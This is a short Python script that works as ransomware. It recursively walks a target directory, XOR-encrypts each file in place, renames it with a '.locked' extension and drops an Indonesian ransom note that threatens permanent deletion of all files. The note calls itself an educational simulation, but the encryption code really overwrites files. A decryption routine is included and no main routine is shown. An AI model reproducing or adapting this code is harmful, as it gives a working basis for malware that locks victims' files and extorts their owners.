import os
import random
import string

def xor_crypt(data, password):
    return bytes([b ^ password[i % len(password)] for i, b in enumerate(data)])

def encrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = xor_crypt(data, password.encode())
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + '.locked')
        return True
    except:
        return False

def decrypt_file(file_path, password):
    try:
        if not file_path.endswith('.locked'):
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        decrypted = xor_crypt(data, password.encode())
        new_path = file_path.replace('.locked', '')
        with open(new_path, 'wb') as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except:
        return False

def get_all_files(target_dir):
    all_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            path = os.path.join(root, file)
            if not file.endswith('.locked') and 'README_FOR_UNLOCK' not in file:
                all_files.append(path)
    return all_files

def generate_password(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def write_warning_file(folder, password):
    readme_path = os.path.join(folder, "README_FOR_UNLOCK.txt")
    with open(readme_path, "w") as f:
        f.write(f"""
⚠️ FILE-FILE ANDA TELAH TERKUNCI ⚠️

Untuk mengembalikan file Anda, gunakan password ini:

🔑 PASSWORD: {password}

⛔ Jika Anda menutup program ini atau melewati batas waktu,
SEMUA file Anda akan DIHAPUS permanen!

[ Simulasi edukasi, tidak merusak sistem ].
""")
